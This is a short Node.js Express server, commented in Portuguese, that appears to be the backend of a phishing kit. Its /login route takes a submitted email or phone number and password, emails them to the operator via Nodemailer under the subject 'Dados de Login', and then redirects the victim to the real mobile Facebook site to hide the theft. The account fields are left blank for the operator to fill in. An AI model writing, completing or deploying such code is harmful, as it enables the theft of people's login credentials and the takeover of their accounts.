const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = 3000;

// Middleware
app.use(cors());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Servir arquivos estáticos da pasta 'public'
app.use(express.static(path.join(__dirname, 'public')));

// Rota para servir o index.html
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Configuração do Nodemailer
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: '',
        pass: ''
    }
});

// Rota para receber os dados do formulário
app.post('/login', (req, res) => {
    const { email, senha } = req.body;

    const mailOptions = {
        from: '',
        to: '',
        subject: 'Dados de Login',
        text: `Número do celular ou email: ${email}\nSenha: ${senha}`
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.error('Erro ao enviar e-mail:', error);
            return res.status(500).send('Erro ao enviar e-mail');
        }
        console.log('E-mail enviado:', info.response);
        
        // Redirecionar após o envio bem-sucedido
        res.redirect('https://m.facebook.com/'); // Redireciona para a rota /success
    });
});



// Iniciar o servidor
app.listen(PORT, () => {
    console.log(`Servidor rodando na porta ${PORT}`);
});
